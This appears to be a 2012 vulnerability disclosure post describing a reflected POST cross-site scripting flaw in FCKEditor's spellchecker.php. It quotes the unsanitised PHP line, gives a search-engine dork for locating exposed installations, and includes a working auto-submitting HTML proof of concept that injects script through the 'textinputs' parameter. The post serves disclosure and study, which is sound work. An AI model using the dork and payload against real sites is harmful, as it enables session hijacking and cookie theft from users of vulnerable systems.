I recently found a reflected POST XSS on a popular web WYSIWYG editor called FCKEditor. Despite is almost end-of-life and replaced with [CKEditor](http://ckeditor.com/) since 2009, FCKEditor is still popular as stand-alone application as embedded in different Wordpress/Joomla/Drupal extensions. 

Today the 2012-06-22, Google counts more than **1,5 billion** of results. A plausbile Google dork filtering out PHP sources could be

[inurl:fck_spellerpages/spellerpages/server-scripts/ -"The following variables"](https://www.google.it/search?q=inurl%3Afck_spellerpages%2Fspellerpages%2Fserver-scripts%2F+-%22The+following+variables%22)

##  vulnerability 

The reflected XSS is injected through `textinputs` POST parameter array, not sanized and printed in line 27:

```php
echo "textinputs[$key] = decodeURIComponent(\"" . $val . "\");\n";
```

As usual, attackers can exploit the reflected XSS to execute arbitrary HTML and script code in a user's browser session that visit the malicious page, which can be exploited to e.g. steal the cookie of the legitimate user to bypass the CMS authorization. The PoC is CRSF-like due to POST HTTP method. 

```html
<html>
<body>
<iframe style="width: 1px; height: 1px; visibility: hidden" name="hidden"></iframe>
  <form method="post" name="sender"
   action="http://vuln.com//fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php" target="hidden">
   <input type="hidden" name="textinputs[]" value='");alert("THIS SITE IS XSS VULNERABLE!");</script><!--' />
  </form>
</body>
<script>document.sender.submit(); </script>
</html>
```
